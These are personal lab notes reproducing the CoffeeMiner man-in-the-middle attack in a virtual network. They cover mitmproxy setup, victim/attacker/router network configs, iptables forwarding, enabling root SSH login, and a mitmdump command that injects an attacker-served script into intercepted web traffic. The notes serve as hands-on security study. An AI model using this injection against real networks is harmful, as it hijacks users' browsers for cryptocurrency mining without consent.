https://www.youtube.com/watch?v=wmYJ6Z4LoCA
http://arnaucube.com/blog/coffeeminer-hacking-wifi-cryptocurrency-miner.html
https://github.com/arnaucube/coffeeMiner
https://github.com/arnaucube/coffeeMiner/blob/master/virtualbox_scenario_instructions.md

## 1. Mitmproxy
https://mitmproxy.org/
https://docs.mitmproxy.org/stable/
 
```
root@kali:~# mitmproxy --version
Mitmproxy: 4.0.4
Python:	3.6.8
OpenSSL:   OpenSSL 1.1.1a  20 Nov 2018
Platform:  Linux-4.19.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling
root@kali:~# mitmdump --version
Mitmproxy: 4.0.4
Python:	3.6.8
OpenSSL:   OpenSSL 1.1.1a  20 Nov 2018
Platform:  Linux-4.19.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling
```

### 1.1 Local setup test
https://medium.com/max-greenwalds-blog/mitmproxy-your-d-i-y-private-eye-864c08f84736
https://juejin.im/post/5ac9ea6d518825364001b5b9
https://blog.heckel.xyz/2013/07/01/how-to-use-mitmproxy-to-read-and-modify-https-traffic-of-your-phone/

Run mitmproxy

![](/docs/docs_image/coder2hacker/realcase/mitm01.png)
![](/docs/docs_image/coder2hacker/realcase/mitm02.png)

Open mitm.it
https://github.com/mitmproxy/mitmproxy/issues/3034
Workaround was navigating to http://mitm.it/cert/pem

![](/docs/docs_image/coder2hacker/realcase/mitm03.png)


### 1.2 Coffeeminer test

**Victim**

![](/docs/docs_image/coder2hacker/realcase/mitm04.png)
![](/docs/docs_image/coder2hacker/realcase/mitm05.png)

```
root@kali:~# vim /etc/network/interfaces
root@kali:~# /etc/init.d/networking restart
[ ok ] Restarting networking (via systemctl): networking.service.
root@kali:~# cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
	address 192.168.134.4
	netmask 255.255.255.0
	gateway 192.168.134.6

```
![](/docs/docs_image/coder2hacker/realcase/mitm06.png)

Script
Param https://github.com/mitmproxy/mitmproxy/blob/master/examples/simple/custom_option.py
https://docs.mitmproxy.org/stable/addons-options/

**Attacker**

![](/docs/docs_image/coder2hacker/realcase/mitm07.png)
![](/docs/docs_image/coder2hacker/realcase/mitm08.png)
```
root@kali:~# cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
	address 192.168.134.3
	netmask 255.255.255.0
	gateway 192.168.134.6

```
![](/docs/docs_image/coder2hacker/realcase/mitm09.png)


**Router**

![](/docs/docs_image/coder2hacker/realcase/mitm10.png)

```
#Dhclient etho0
root@kali:~# vim /etc/network/interfaces
root@kali:~# /etc/init.d/networking restart
[....] Restarting networking (via systemctl): networking.serviceJob for networking.service failed because the control process exited with error code.
See "systemctl status networking.service" and "journalctl -xe" for details.
 failed!


oot@kali:~# cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp

auto eth1
iface eth1 inet static
	address 192.168.134.6
	netmask 255.255.255.0
```

![](/docs/docs_image/coder2hacker/realcase/mitm11.png)

![](/docs/docs_image/coder2hacker/realcase/mitm12.png)

**Start**

router_kali
```
root@kali:~# iptables --flush
root@kali:~# iptables --table nat --flush
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
root@kali:~# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
root@kali:~# iptables -A FOWARD -i eth0 -o eth1 -j ACCEPT
iptables v1.8.2 (nf_tables): Chain 'FOWARD' does not exist
root@kali:~# iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
root@kali:~# iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
```

Attack
```
vim /etc/ssh/sshd_config
PemitRootLogin yes
systemctl restart ssh.service
```

![](/docs/docs_image/coder2hacker/realcase/mitm13.png)

mitmdump -s injector.py --set custom='http://127.0.0.1:8000/script.js'

## troubleshooting

mitmdump was not found https://github.com/arnaucube/coffeeMiner/issues/26
/usr/bin/mitmdump no such script https://unix.stackexchange.com/questions/446289/mitmdump-error-usr-bin-mitmdump-no-such-scripts
unrecognized arguments: -T https://github.com/arnaucube/coffeeMiner/issues/28

## Applications 
https://engineering.linecorp.com/en/blog/auto-inspecting-testing-with-google-analytics/


